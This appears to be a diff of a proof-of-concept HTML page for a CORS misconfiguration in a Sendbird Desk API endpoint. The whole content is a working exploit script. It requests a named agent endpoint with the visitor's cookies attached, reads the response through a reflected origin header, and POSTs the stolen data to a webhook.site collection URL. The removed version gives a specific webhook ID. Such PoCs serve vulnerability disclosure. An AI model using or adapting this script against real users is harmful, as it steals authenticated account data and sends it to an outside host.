@@ -1,27 +1,12 @@
 <!doctype html>
-<meta charset="utf-8">
-<title>Sendbird CORS leak PoC</title>
 <script>
 (async () => {
-  try {
-    // 1️⃣ Pull the sensitive data with cookies attached
-    const res = await fetch(
+  const res = await fetch(
       'https://desk-api-us-3.sendbird.com/api/agents/27405',
-      { credentials: 'include', headers: { 'Accept': 'application/json' } }
-    );
-    const body = await res.text();      // visible because ACAO reflects our origin
-
-    // 2️⃣ Push it to webhook.site (mode:no-cors sidesteps CORS on the exfil request)
-    await fetch('https://webhook.site/965c52a8-a7cc-49dd-bf8b-dcdb58a0b70f', {
-      method: 'POST',
-      mode: 'no-cors',
-      body: body
-    });
-
-    // 3️⃣ Give visual feedback (optional)
-    document.body.textContent = '✓ Exploit sent – check webhook.site';
-  } catch (e) {
-    document.body.textContent = '✗ Exploit failed: ' + e;
-  }
+      {credentials:'include', headers:{Accept:'application/json'}}
+  );
+  const body = await res.text();
+  await fetch('https://webhook.site/<uuid>', {method:'POST', mode:'no-cors', body});
+  document.body.textContent = '✓ Sent – check webhook.site';
 })();
 </script>
